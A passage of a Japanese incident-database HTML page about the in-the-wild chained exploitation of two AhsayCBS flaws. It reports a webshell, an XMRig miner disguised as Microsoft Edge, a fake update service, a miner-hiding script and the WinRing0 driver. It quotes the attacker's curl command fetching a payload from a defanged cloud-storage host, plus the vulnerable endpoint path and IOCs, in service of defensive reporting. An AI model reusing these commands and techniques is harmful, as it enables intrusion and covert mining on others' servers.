@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<title>AhsayCBSの認証回避＋RCE連鎖が実地悪用 — インシデント事例DB</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --border-2: #21262d;
+  --text: #e6edf3;
+  --dim: #8b949e;
+  --dim-2: #6e7681;
+  --faint: #484f58;
+  --accent: #58a6ff;
+  --ok: #3fb950;
+  --warn: #d29922;
+  --danger: #f85149;
+  --purple: #a371f7;
+  --purple-2: #d2a8ff;
+  --orange: #db6d28;
+  --code: #161b22;
+  --grp-a: #f85149;
+  --grp-b: #3fb950;
+  --grp-c: #d29922;
+  --grp-s: #8b949e;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);
+ font-family:-apple-system,'Hiragino Kaku Gothic Pro','Meiryo',sans-serif;
+ font-size:14px;line-height:1.75;overflow-wrap:anywhere}
+/* **長い機械文字列だけを折る。** CVSS ベクタ（69字）・SHA-256（64字）・
+   ウォレットアドレス（42字）は空白が無いので折り返せず、375px では
+   ページ全体が 474px まで横に伸びていた（2026-09-08 の実測）。
+   `word-break:break-all` は日本語の本文まで無条件に切ってしまうので使わない。
+   `overflow-wrap:anywhere` は**入りきらないときだけ**折り、加えて
+   min-content を縮めるのでグリッドの列が押し広げられなくなる
+   （break-word だと min-content が縮まず .figs の列がはみ出したまま）。
+   nowrap を指定したバッジ・表見出しには効かない（そちらが優先される）。 */
+/* **固定するのは h1 だけ。** ヘッダ全体を固定していたため、スクロール中も
+   サブタイトル（3行）とバッジが居座って画面を占有していた（2026-08-29 の指摘）。
+   h1 を header の外に出してあるのは、sticky が親の範囲内でしか効かないため。 */
+h1.stickytitle{position:sticky;top:0;z-index:100;margin:0;
+ background:var(--surface);border-bottom:1px solid var(--border);
+ padding:11px 20px;font-size:18px;font-weight:700;line-height:1.4;
+ display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;
+ overflow:hidden}
+h1.stickytitle .stid{font-family:monospace;font-size:11.5px;color:var(--dim);
+ font-weight:400;margin-right:9px}
+.site-header{background:var(--surface);border-bottom:1px solid var(--border);
+ padding:10px 20px 12px}
+.site-header .id{font-family:monospace;font-size:12px;color:var(--dim)}
+/* サブタイトル。元の長いタイトルを降ろす場所。**主張を弱めて場所を取らせない**
+   （スマホで h1 が6行・画面の22%を占めていた。2026-08-29） */
+.site-header .subtitle{font-size:12.5px;line-height:1.65;color:var(--dim);
+  margin:0 0 8px;font-weight:400}
+@media(max-width:600px){
+  h1.stickytitle{font-size:16px;padding:9px 12px;line-height:1.38}
+  .site-header{padding:8px 12px 10px}
+  /* 狭い画面ではサブタイトルを3行で切る。全文は本文冒頭の要約で読める */
+  .site-header .subtitle{font-size:12px;line-height:1.6;
+    display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;
+    overflow:hidden}
+}
+.wrap{max-width:1100px;margin:0 auto;padding:20px}
+/* **本文の行長は保つ。** 幅を広げても段落まで広げると読みにくくなる。
+   1440px で測ると本文はすでに1行60字あり、日本語の適正（40〜50字）を
+   超えていた（2026-08-31）。広げた分は表・図・年表に使わせる。 */
+.wrap p,.wrap li,.lead,.absent,.ctl{max-width:900px}
+.twrap,.figs,table.g,.tl,.part{max-width:none}
+.b{display:inline-block;font-size:11px;font-weight:600;padding:1px 7px;
+ border-radius:4px;margin:0 4px 3px 0;white-space:nowrap;vertical-align:middle}
+.b.type{background:#64b5f626;color:var(--accent);border:1px solid var(--accent)}
+.b.type2{color:var(--accent);border:1px solid #64b5f655}
+.b.st,.b.jr{color:var(--dim);border:1px solid var(--border)}
+.b.cause{color:var(--warn);border:1px solid #ffcc8055}
+.b.role{background:var(--surface2);color:var(--text)}
+.b.lc{color:var(--dim);border:1px solid var(--border)}
+.b.conf{background:#64b5f626;color:var(--accent)}
+.b.org{color:var(--dim);border:1px solid var(--border)}
+.b.sub{color:var(--warn);border:1px solid #ffcc8055}
+.b.rsn{color:var(--warn);border:1px solid #ffcc8055}
+.b.dk{color:var(--danger);border:1px solid #f48fb155}
+.b.kind{color:var(--dim);border:1px solid var(--border)}
+.b.slot{color:var(--dim);border:1px solid var(--border);font-weight:400}
+.b.tag{background:var(--surface2);color:var(--dim)}
+.b.rev,.b.ind,.b.refl{color:var(--ok);border:1px solid #80cbc455}
+.b.fu,.b.dead{color:var(--danger);border:1px solid #f48fb155}
+.lead{background:var(--surface);border-left:3px solid var(--accent);
+ padding:14px 16px;border-radius:0 6px 6px 0;margin:16px 0}
+.upd{background:var(--surface);border-left:3px solid var(--warn, #d29922);
+ padding:10px 16px;border-radius:0 6px 6px 0;margin:0 0 16px;font-size:13px}
+.upd-h{display:flex;gap:12px;align-items:baseline;flex-wrap:wrap;margin-bottom:4px}
+.upd-d{font-weight:600;color:var(--warn, #d29922)}
+.upd a{margin-left:auto}
+.meta{display:flex;gap:20px;flex-wrap:wrap;font-size:12px;color:var(--dim);margin:10px 0 4px}
+section{margin:26px 0}
+section h2{font-size:15.5px;color:var(--accent);border-bottom:1px solid var(--border);
+ padding-bottom:6px;margin-bottom:10px;line-height:1.55}
+section p{margin:9px 0}
+.srcs{font-size:11px;color:var(--dim);font-weight:400;margin-left:6px;white-space:nowrap}
+.blk{margin:26px 0}
+.blk h3{font-size:13px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em;
+ margin-bottom:10px;border-bottom:1px solid var(--border);padding-bottom:5px}
+/* 関係した組織（B79）——表ではなく1組織1ブロック。
+   画面が広いときだけ 名前｜説明 の2段組にする。説明は中央値72字の文章なので、
+   狭い画面では幅を全部使わせる */
+.orgs{margin:6px 0}
+.org{display:grid;grid-template-columns:minmax(150px,210px) 1fr;gap:3px 16px;
+ padding:10px 0;border-top:1px solid var(--border)}
+.org:first-child{border-top:none;padding-top:2px}
+.org-h{display:flex;flex-wrap:wrap;gap:5px;align-items:baseline}
+.org-n{font-weight:600;font-size:13px;line-height:1.5}
+.org-b{font-size:13px;line-height:1.75}
+.org-p{margin:0 0 4px}
+.org-p:last-child{margin-bottom:0}
+.org-l{display:inline-block;min-width:2.6em;margin-right:8px;font-size:11px;
+ color:var(--dim);font-weight:600}
+@media(max-width:600px){
+ .org{grid-template-columns:1fr;gap:5px}
+ .org-b{font-size:12.5px}
+}
+table.g{border-collapse:collapse;width:100%;font-size:13px;margin:6px 0}
+/* 表は自分の中で横に流す。ページ全体が横スクロールすると本文が読めなくなる
+   （スマホで 811px の表がはみ出していた。2026-08-29） */
+.twrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:6px 0}
+.twrap table.g{margin:0}
+table.g th{background:var(--surface2);padding:7px 9px;text-align:left;
+ border:1px solid var(--border);font-weight:600;white-space:nowrap}
+table.g td{padding:7px 9px;border:1px solid var(--border);vertical-align:top}
+table.g tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+table.dt th{width:150px;color:var(--dim)}
+.on{font-weight:600}
+.sm{font-size:12px;color:var(--dim);line-height:1.6}
+.nowrap{white-space:nowrap} .tw{width:132px}
+.figs{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(270px,100%),1fr));gap:10px}
+.fig{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:11px 13px}
+.fh{display:flex;flex-wrap:wrap;align-items:baseline;gap:4px;margin-bottom:5px}
+.fl{font-size:12px;color:var(--dim);flex:1;min-width:100%;line-height:1.5}
+.fv{font-size:23px;font-weight:700;line-height:1.25}
+.fu{font-size:12px;font-weight:400;color:var(--dim);margin-left:4px}
+.fa{font-size:11px;color:var(--dim);margin-top:2px}
+.fn{font-size:11.5px;color:var(--dim);margin-top:7px;padding-top:7px;
+ border-top:1px solid var(--border);line-height:1.65}
+.corr{font-size:11.5px;margin-top:6px;padding:5px 8px;background:var(--surface2);
+ border-radius:4px;color:var(--warn)}
+.box{border-radius:8px;padding:14px 16px;margin:26px 0}
+.box .bt{font-size:13px;font-weight:700;margin-bottom:9px}
+.box .bc{display:inline-block;font-size:11px;padding:0 7px;border-radius:9px;
+ margin-left:7px;background:rgba(255,255,255,.09)}
+.box ul{list-style:none}
+.box li{padding:7px 0;border-top:1px solid rgba(255,255,255,.07)}
+.box li:first-child{border-top:none}
+.unk{background:#ffcc8014;border:1px solid #ffcc8044}
+.unk .bt{color:var(--warn)}
+.disc{background:#f48fb114;border:1px solid #f48fb144}
+.disc .bt{color:var(--danger)}
+.rep-box{background:#80cbc414;border:1px solid #80cbc444}
+.rep-box .bt{color:var(--ok)}
+.rep{padding:8px 0;border-top:1px solid rgba(255,255,255,.07)}
+.rep:first-of-type{border-top:none}
+.ui{font-weight:600;margin-right:6px}
+.cl{margin-left:18px} .cl li{margin:2px 0}
+.sub{font-size:12.5px;padding:3px 0;color:var(--text)}
+.rg{margin-bottom:16px}
+.rgt{font-size:12px;font-weight:700;color:var(--accent);margin-bottom:5px}
+.rg ol{list-style:none}
+.rg li{font-size:12.5px;padding:4px 0;line-height:1.7}
+.rid{font-family:monospace;color:var(--dim);margin-right:3px}
+a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+code{background:var(--code);border-radius:3px;padding:1px 5px;font-size:12px;color:#a5b4fc}
+ul,ol{margin:8px 0 8px 20px} li{margin:3px 0}
+strong{color:#f1f5f9}
+/* 目次 — 広い画面では左に追従、狭い画面では折りたたみ */
+html{scroll-behavior:smooth}
+.blk,section,.part,.box,.less{scroll-margin-top:92px}
+.toc{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+ padding:12px 14px;margin:18px 0}
+.toc>summary{cursor:pointer;font-size:13px;font-weight:700;color:var(--accent);
+ list-style:none}
+.toc>summary::-webkit-details-marker{display:none}
+.toc>summary::before{content:"▾ ";font-size:11px}
+.toc:not([open])>summary::before{content:"▸ "}
+.tocl{list-style:none;margin:10px 0 0;padding:0;
+ columns:2;column-gap:22px}
+.tocl li{margin:0;break-inside:avoid}
+.tocl li.tg{font-size:11px;font-weight:700;letter-spacing:.04em;margin:9px 0 3px;
+ padding-top:7px;border-top:1px solid var(--border)}
+.tocl li.tg:first-child{margin-top:0;padding-top:0;border-top:none}
+.tocl li.tg1{color:var(--accent)}
+.tocl li.tg2{color:var(--ok)}
+.tocl li.tg3{color:var(--dim)}
+.tocl a{display:block;font-size:12.5px;padding:2.5px 0;line-height:1.55;
+ color:var(--text);text-decoration:none}
+.tocl a:hover{color:var(--accent);text-decoration:underline}
+@media(min-width:1180px){
+ /* PC で左右に大きな余白ができて「狭い」と見えていたので広げた
+    （1440px の画面で コンテナ1180px・本文870px＝画面の60%だった）。
+    minmax(0,1fr) にしないと、広い表が入ったときにカラムがはみ出す */
+ .wrap{max-width:1400px;display:grid;grid-template-columns:260px minmax(0,1fr);
+   gap:38px;align-items:start}
+ .wrap>.meta,.wrap>.lead,.wrap>footer{grid-column:2}
+ .toc{grid-column:1;grid-row:1 / span 99;position:sticky;top:92px;
+   max-height:calc(100vh - 110px);overflow:auto;margin:0}
+ .tocl{columns:1}
+ .toc>summary{pointer-events:none}
+ .toc>summary::before{content:""}
+}
+@media(max-width:1179px){
+ .tocl{max-height:none}
+}
+@media(min-width:1180px){
+ /* 本文カラムが広くなった分、段落だけ行長を保つ（表と図は全幅を使う） */
+ .wrap>*:not(.toc) p,.wrap>*:not(.toc) li{max-width:960px}
+}
+@media(max-width:600px){
+ .tocl{columns:1}
+}
+/* 2部構成の仕切り */
+.part{margin:34px 0 20px;padding:14px 16px;border-radius:8px}
+.part .ph{font-size:17px;font-weight:700;display:flex;align-items:center;gap:10px}
+.part .pn{font-size:11px;font-weight:700;padding:2px 9px;border-radius:4px;letter-spacing:.04em}
+.part .pd{font-size:12px;color:var(--dim);margin-top:6px;line-height:1.75}
+.p1{background:#64b5f612;border:1px solid #64b5f644;border-left:4px solid var(--accent)}
+.p1 .ph{color:var(--accent)} .p1 .pn{background:var(--accent);color:#0f1117}
+.p2{background:#80cbc412;border:1px solid #80cbc444;border-left:4px solid var(--ok)}
+.p2 .ph{color:var(--ok)} .p2 .pn{background:var(--ok);color:#0f1117}
+.blknote{font-size:11.5px;color:var(--dim);margin:-4px 0 10px;line-height:1.7}
+/* 攻撃の経過 */
+.chain{list-style:none;margin:10px 0 0}
+.chain li{position:relative;padding:10px 0 10px 16px;border-left:2px solid var(--border);
+ margin-left:4px}
+.chain li::before{content:"";position:absolute;left:-6px;top:16px;width:9px;height:9px;
+ border-radius:50%;background:var(--accent)}
+.stg{margin-bottom:5px}
+.b.stage{background:#64b5f626;color:var(--accent)}
+.b.do,.b.eff,.b.assess,.b.axis{color:var(--dim);border:1px solid var(--border)}
+/* 対応の指標 */
+.mets{display:grid;grid-template-columns:repeat(auto-fill,minmax(min(160px,100%),1fr));gap:9px}
+.met{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+.ml{font-size:11.5px;color:var(--dim);line-height:1.5}
+.mv{font-size:22px;font-weight:700;margin-top:3px}
+.dec{list-style:none;margin:6px 0 0}
+.dec li{padding:9px 0;border-top:1px solid var(--border)}
+.dec li:first-child{border-top:none}
+/* 構造図 */
+.dia{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
+.diat{font-size:13px;font-weight:700;margin-bottom:8px}
+.svgwrap{overflow-x:auto}
+.svgwrap svg{min-width:620px}
+/* 学び */
+.less{background:#80cbc40e;border:1px solid #80cbc433;border-radius:8px;
+ padding:14px 16px;margin:18px 0}
+.lesst{font-size:13px;font-weight:700;color:var(--ok);margin-bottom:8px}
+.less ul{list-style:none;margin:0}
+.less li{padding:11px 0;border-top:1px solid rgba(255,255,255,.07)}
+.less li:first-child{border-top:none}
+.lp{font-weight:700;line-height:1.65}
+.lw{font-size:12.5px;color:var(--dim);margin-top:4px;line-height:1.7}
+.la{font-size:12.5px;margin-top:6px;padding:7px 10px;background:var(--surface2);
+ border-radius:5px;line-height:1.7}
+.la b{color:var(--ok);margin-right:6px}
+/* 内容が無いことを明示する箱（黙って省略しない） */
+.absent{font-size:12.5px;color:var(--dim);background:var(--surface);
+ border:1px dashed var(--border);border-radius:6px;padding:11px 13px;line-height:1.75}
+.less.empty{background:transparent;border-style:dashed}
+.less.empty .lesst{color:var(--dim)}
+.chk{color:var(--ok);font-weight:700;margin-right:5px}
+.cl.ok li{color:var(--text)} .cl.warn li{color:var(--warn)}
+.ctl{padding:2px 0;font-size:12.5px}
+footer{border-top:1px solid var(--border);margin-top:40px;padding:18px 0;
+ font-size:11.5px;color:var(--dim);line-height:1.9}
+@media(max-width:600px){
+ .wrap{padding:14px 12px} .figs{grid-template-columns:1fr}
+ table.g{font-size:12px} table.dt th{width:auto}
+ .twrap{width:auto}
+ .twrap table.g{min-width:520px}
+}
+</style>
+</head>
+<body>
+<h1 class="stickytitle"><span class="stid">INC-2026-0446</span>AhsayCBSの認証回避＋RCE連鎖が実地悪用</h1>
+<header class="site-header">
+  <p class="subtitle">バックアップ管理コンソール AhsayCBS の2つの脆弱性（CVE-2026-105133 の認証不備と CVE-2026-105134 の未認証リモートコード実行）が連鎖させて実地で悪用され、 JSP ウェブシェルと XMRig 採掘機、Microsoft Edge を装う常駐サービス、 脆弱な正規ドライバ WinRing0 が投入された——Huntress は 10.3.4 も影響を受けると訂正し、 修正版が無いため管理画面の到達制限と侵害の調査を勧告している</p>
+  <div><span class="b type">脆弱性</span><span class="b type2">脅威・攻撃キャンペーン</span><span class="b st">初報のみ</span><span class="b jr">有名事象として記録（日本と直接の関係は薄い）</span><span class="b cause">設計・実装上の不備</span><span class="b cause">既知の脆弱性の悪用</span></div>
+</header>
+<div class="wrap">
+
+<div class="meta">
+  <span>初報: 2026年10月8日（Huntress の公開）</span>
+  <span>最終更新: 2026年10月9日</span>
+</div>
+
+<div class="lead"><p><strong>修正版が無い状態で、実地の悪用が始まっている。これが本件の要点である。</strong></p>
+<p>2026年10月4日、バックアップ管理コンソール <strong>AhsayCBS</strong>（Cloud Backup Server）に2つの脆弱性が特定された。</p>
+<ul>
+<li><strong>CVE-2026-105133</strong>（中程度）— <code>filecom/ahsay/obs/api/ApiStructsAction.java</code> の<code>checkSysPwd</code> 関数に関する<strong>認証の不備</strong></li>
+<li><strong>CVE-2026-105134</strong>（致命的）— Replication Receiver の<code>/rps/api/json/UpdateReceivers.do</code> に対する<strong>未認証のリモートコード実行</strong>。成功すると<strong>NT AUTHORITY\SYSTEM として</strong>コードが実行できる</li>
+</ul>
+<p><strong>Huntress は、この2つが連鎖して使われているのを観測している</strong>——まず CVE-2026-105133 で認証を回避し、次に CVE-2026-105134 で実行を得る。観測の開始は<strong>2026年10月7日 23:20:15 UTC</strong>。露出していたシステムで未認証のリモートコード実行とウェブシェルの設置が行われた。</p>
+<p>侵害後の挙動は採掘である。攻撃者は AhsayCBS のサービス実行ファイル（<code>cbssvcX64.exe</code>）から子プロセスを生み、Alibaba Cloud のオブジェクトストレージから <code>Taskgmr.ps1</code>・<code>msedge.exe</code>・<code>edge.exe</code>・<code>config.json</code> を一時フォルダへ落とした。<strong><code>edge.exe</code> は XMRig（Monero の採掘機）で、Microsoft Edge を装っている。</strong> <strong><code>msedge.exe</code> は正規ユーティリティ NSSM の改変版</strong>で、<code>MicrosoftEdgeUpdateSvc</code> という<strong>本物の Edge 更新サービスに似せた名前の Windows サービス</strong>を作って SYSTEM 権限で採掘機を常駐させた。<code>Taskgmr.ps1</code> は<strong>AI の助けを借りて書かれたとみられる</strong>（註釈されたコードから）スクリプトで、<strong>タスクマネージャーが開かれたらサービスを止め、閉じられたら再び動かす。</strong>さらに一部の事案では、<strong>脆弱な正規カーネルドライバ <code>WinRing0x64.sys</code></strong>が<code>certutil.exe</code> で持ち込まれ、採掘機にハードウェアへの低レベルの到達を与えていた。</p>
+<p><strong>そして最も重要なのは、Huntress が当初の報告を訂正した点である。</strong> 2026年10月8日 18時（米国東部時間）の更新で、<strong>「追加の調査により、Ahsay 10.3.4 も影響を受けると判断した。以前の報告では 10.3.4 は影響を受けないとしていたが、調査結果を反映して改めた」</strong>とし、<strong>「修正が入手できるようになるまでは、管理用インターフェースへのアクセスを制限し、侵害の痕跡を調査することを推奨する」</strong>と述べている（原文英語）。<strong>一方、CVE の記載（VulDB・INCIBE-CERT）は影響を 10.3.2 以前とし、解決策を「10.3.4 へのアップグレード」としている。</strong> <strong>この食い違いは運用の判断を直接左右する</strong>（後述の齟齬参照）。</p>
+<p><strong>本記録がこの事案を取り上げる理由は3つある</strong>（本記録の判断）。①<strong>壊れたのがバックアップの管理基盤である</strong>——復旧の最後の拠り所を握られると、ランサムウェアへの耐性そのものが消える。②<strong>MSP が主な利用者である</strong>——1つの管理コンソールの背後に多数の顧客環境がある。③<strong>採掘で終わっているが、同じ入口は何にでも使える</strong>—— Huntress は「攻撃者は長期の常駐のために二次的な裏口を隠せている」として、痕跡が見つかった場合は<strong>信頼できるバックアップからの完全な再構築</strong>を勧めている。</p></div>
+
+
+<details class="toc" id="toc" open><summary>目次</summary><ol class="tocl"><li class="tg tg1">起きたこと</li><li><a href="#s1" title="公表されていない・確定していないこと">公表されていない・確定していないこと</a></li><li><a href="#s2" title="関係した組織">関係した組織</a></li><li><a href="#s3" title="主な数値">主な数値</a></li><li><a href="#s4" title="攻撃の経過">攻撃の経過</a></li><li><a href="#s5" title="公表・報道からわかったこと（6件）">公表・報道からわかったこと（6件）</a></li><li><a href="#s11" title="経過">経過</a></li><li><a href="#s12" title="資料間の食い違い・留保">資料間の食い違い・留保</a></li><li class="tg tg2">ここから学べること</li><li><a href="#s13" title="波及の構造">波及の構造</a></li><li><a href="#s14" title="どこで止められたか">どこで止められたか</a></li><li><a href="#s15" title="対応の評価">対応の評価</a></li><li><a href="#s16" title="CISO・経営層への示唆">CISO・経営層への示唆</a></li><li><a href="#s17" title="セキュリティ技術者への示唆">セキュリティ技術者への示唆</a></li><li><a href="#s18" title="自組織に当てはまるか">自組織に当てはまるか</a></li><li class="tg tg3">資料</li><li><a href="#s19" title="出典">出典</a></li><li><a href="#s20" title="この記録の更新履歴">この記録の更新履歴</a></li><li><a href="#s21" title="タグ">タグ</a></li></ol></details>
+
+<div class="part p1" id="part1"><div class="ph"><span class="pn">Part 1</span>起きたこと</div><div class="pd">公表資料と報道から確認できた事実を記録します。確定した事実・報道にとどまる情報・公表されていない事項を区別して示します。評価や推奨はここには書きません。</div></div>
+<div id="s1"><div class="box unk"><div class=bt>公表されていない・確定していないこと<span class=bc>7</span></div><ul><li><span class=ui>被害を受けた組織の数・名称・業種・国</span><span class="b rsn">公表されていない</span></li><li><span class=ui>修正版の提供時期と、Ahsay の公式の声明</span><span class="b rsn">公表されていない</span></li><li><span class=ui>10.3.4 以降の版・10.3.3 の扱い</span><span class="b rsn">公表されていない</span></li><li><span class=ui>悪用がいつ始まったか（2026年10月7日より前の悪用の有無）</span><span class="b rsn">公表されていない</span></li><li><span class=ui>CVE-2026-105133 と CVE-2026-105134 の報告者と、公開までの経緯</span><span class="b rsn">公表されていない</span></li><li><span class=ui>採掘以外の目的（情報の持ち出し・ランサムウェア）の有無</span><span class="b rsn">調査中</span></li><li><span class=ui>日本の組織の利用状況・被害の有無</span><span class="b rsn">探索したが未発見</span></li></ul></div></div>
+<div class="blk " id="s2"><h3>関係した組織</h3><div class=orgs><div class=org><div class=org-h><span class=org-n>Ahsay Systems Corporation Limited（AhsayCBS の開発元）</span><span class="b role">製品・部品の供給元</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>Huntress</span><span class="b role">報告したベンダー</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>VulDB／INCIBE-CERT（CVE の記載元）</span><span class="b role">注意喚起主体</span><span class="b lc">確認済</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>（AhsayCBS を運用していた被害組織。数・名称・業種・国はいずれも公表されていない）</span><span class="b role">被害組織</span><span class="b lc">推定</span></div><div class=org-b></div></div><div class=org><div class=org-h><span class=org-n>（攻撃者。帰属への言及は無い）</span><span class="b role">推定加害者</span><span class="b lc">関係未公表</span></div><div class=org-b></div></div></div></div>
+<div class="blk " id="s3"><h3>主な数値</h3><div class="blknote">各数値には確度（確定／約／最大）と出所（公表値／報道値／本記録の算出）を付しています。</div><div class=figs><div class=fig><div class=fh><span class=fl>CVE-2026-105134 の CVSS v3.1 基本値</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>10.0<span class=fu>点</span></div><div class=fn>VulDB／INCIBE-CERT の記載。**満点である。** CVSS v4.0 では 9.3（Critical）、CVSS v2.0 では 10.0。 v4.0 のベクターには **E:P**（実証コードが存在する）が含まれる。 **ただし点数は「影響の大きさ」の指標であり、 本件で重いのは点数ではなく〈修正版が利用者の手元に無い〉ことである**（本記録の評価）</div></div><div class=fig><div class=fh><span class=fl>CVE-2026-105133 の CVSS v3.1 基本値</span><span class="b conf">確定</span><span class="b org">第三者調査</span></div><div class=fv>7.3<span class=fu>点</span></div><div class=fn>VulDB／INCIBE-CERT の記載（CVSS v4.0 では 5.5＝MEDIUM、CVSS v2.0 では 7.5）。 **Huntress は本件を「medium-severity」と記している。** **単独では中程度だが、連鎖の1段目として機能している**（本記録の評価）—— これが認証を外し、CVE-2026-105134 が実行を取る</div></div><div class=fig><div class=fh><span class=fl>脆弱性の特定から実地での悪用の観測までの日数</span><span class="b conf">確定</span><span class="b org">本記録の算出</span></div><div class=fv>3<span class=fu>日</span></div><div class=fn>2026年10月4日の特定から10月7日 23:20:15 UTC の観測まで（本記録の算出）。 **「悪用が始まった日」ではなく「Huntress が観測した日」である**—— それ以前の悪用の有無は公表されていない（本記録の留保）。 **3日は、CVE の記載が最終更新された10月6日の翌日にあたる**</div></div><div class=fig><div class=fh><span class=fl>Huntress が公開した Sigma ルールの本数</span><span class="b conf">確定</span><span class="b org">公表値</span></div><div class=fv>4<span class=fu>本</span></div><div class=fn>Huntress の脅威インテリジェンスのリポジトリ （`2026/2026-10/AhsayCBS_XMRig_Miner`）に公開された。 **いずれも侵害後の検知**であり、 「攻撃者が採掘機を投入・隠蔽・実行するために依存する段階をそれぞれ狙っているため、 どれか1本で鳴れば連鎖を断つ機会が得られる」と説明されている</div></div><div class=fig><div class=fh><span class=fl>採掘機が接続したポート</span><span class="b conf">確定</span><span class="b org">公表値</span></div><div class=fv>8,029<span class=fu>番</span></div><div class=fn>XMRig の採掘機（`edge.exe`）が Monero のプール （`51.195.127[.]124:8029`・`xmr.kryptex[.]network`）へ接続した際のポート。 **ATT&amp;CK では T1571（非標準ポート）に対応づけられている。** **出口の通信を既定で拒否し必要な宛先だけ許す運用なら、ここで止まる**（本記録の評価）</div></div></div></div>
+<div class="blk " id="s4"><h3>攻撃の経過</h3><div class="blknote">公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。</div><p>**2つの脆弱性を連鎖させ、未認証で SYSTEM 権限のコード実行を得てから、 採掘のための常駐の仕組みを組み立てている。** まず CVE-2026-105133 で認証を回避し、 次に CVE-2026-105134（`/rps/api/json/UpdateReceivers.do`）で実行を得る。 Huntress によれば、攻撃者は**悪性の replication receiver を設定**し、 **CBS アプリケーションが配信するディレクトリへ JSP のウェブシェルを設置**した。 その後、`cbssvcX64.exe` から生まれた子プロセスが Alibaba Cloud のオブジェクトストレージから4つのファイルを一時フォルダへ落とし、 **XMRig の採掘機（`edge.exe`）を Microsoft Edge に見せかけ、 改変した NSSM（`msedge.exe`）を `MicrosoftEdgeUpdateSvc` という 紛らわしい名前の Windows サービスとして SYSTEM 権限で常駐させた。** `Taskgmr.ps1` は**タスクマネージャーの起動を監視してサービスを止め、 閉じられたら再開する**——利用者の目から採掘を隠すための仕掛けである。 一部の事案では**脆弱な正規カーネルドライバ `WinRing0x64.sys`**が `certutil.exe` で持ち込まれ、採掘機にハードウェアへの低レベルの到達を与えた。 **AhsayCBS はバックアップの管理コンソールであり、 侵害されたのは復旧の最後の拠り所である**（本記録の評価）</p><ol class=chain><li><div class=stg><span class="b stage">1. 初期侵入</span><span class="b conf">disclosed</span><span class=srcs>[1] [2] [3]</span></div><div>**CVE-2026-105133 で認証を回避し、CVE-2026-105134 で実行を得る。** Huntress は CVE-2026-105134 について 「この API には認証の回避があり、**無作為のトークンが正当な資格情報の代わりになりうる**」と 説明し、成功すると**NT AUTHORITY\SYSTEM として**ホスト上でコードが実行できるとしている（原文英語）。 一方、**VulDB・INCIBE-CERT は同じ脆弱性を `random` 引数の操作による OS コマンドインジェクション（CWE-77）と分類している** （discrepancies に記録した）。 観測の開始は**2026年10月7日 23:20:15 UTC**で、 **攻撃は外部に公開された Web アプリのサービスを狙っている**</div><div class=fn>根拠: Huntress の報告（2026年10月8日）の 「Starting 2026-10-07 23:20:15 UTC, Huntress observed threat actors exploiting the vulnerabilities to gain unauthenticated remote code execution and deploy webshells on exposed systems」 および ATT&amp;CK 対応表の T1190（公開アプリケーションの悪用）の行</div></li><li><div class=stg><span class="b stage">2. 永続化</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**攻撃者は悪性の replication receiver を設定し、 CBS アプリケーションが配信するディレクトリへ JSP のウェブシェルを設置した。** Huntress は「一部の事案では、悪用の直後に Web アプリのディレクトリへ `.jsp` のウェブシェルを設置するのを見た」としている。 **ウェブシェルは、脆弱性が修正された後も残る裏口である**（本記録の評価）</div><div class=fn>根拠: Huntress の報告の「After exploitation, a threat actor configured a malicious receiver and dropped a Java Server Page (JSP) webshell into the application directory served by the CBS application」 および ATT&amp;CK 対応表の T1505.003（サーバソフトウェア部品: ウェブシェル）の行</div></li><li><div class=stg><span class="b stage">3. C2通信</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**`cbssvcX64.exe` から生まれた一連のコマンドが、 `%TEMP%` または `../AppData/Local/Temp` へ4つのファイルを落とした**—— `Taskgmr.ps1`・`msedge.exe`・`edge.exe`・`config.json`。 取得元は **hxxp://imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com** （Alibaba Cloud のオブジェクトストレージ）である。 取得には `curl` が使われた（実際のコマンド行が報告に掲載されている）。 **配送に正規のクラウドストレージを使うのは、 宛先の評判で遮断されにくくするための選択である**（本記録の読み）</div><div class=fn>根拠: Huntress の報告の該当記述と、掲載された curl のコマンド行 （`curl -sk -o &quot;...Taskgmr.ps1&quot; &quot;http://imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com/javas/Office/win/Taskgmr.ps1&quot; --max-time 60`）、 および ATT&amp;CK 対応表の T1105（侵入時のツール転送）・ T1071.001（アプリケーション層プロトコル: Web プロトコル）の行</div></li><li><div class=stg><span class="b stage">4. 権限昇格</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**攻撃者は PowerShell で一時フォルダの `config.json` を書き換えたうえで、 `MicrosoftEdgeUpdateSvc` という Windows サービスを作成した。** これは**本物の Microsoft Edge の更新サービス（`edgeupdate`）に 似せた名前**であり、一時フォルダの `msedge.exe` を **SYSTEM 権限で**動かすよう設定されていた。 **`msedge.exe` は正規ユーティリティ NSSM の改変版**で、 NSSM は他のプログラムを動かし続け、異常終了や再起動の後に再開させる働きを持つ。 **採掘機（`edge.exe`）を常駐させ、同時にサービス関連の実行ファイルを 正規に見せるために使われたとみられる**（Huntress の評価）</div><div class=fn>根拠: Huntress の報告の該当記述と、 ATT&amp;CK 対応表の T1543.003（Windows サービスの作成・改変。 永続化と権限昇格の両方に対応づけられている）・ T1569.002（システムサービス: サービスの実行）・ T1036.004（masquerading: タスクまたはサービスの偽装）・ 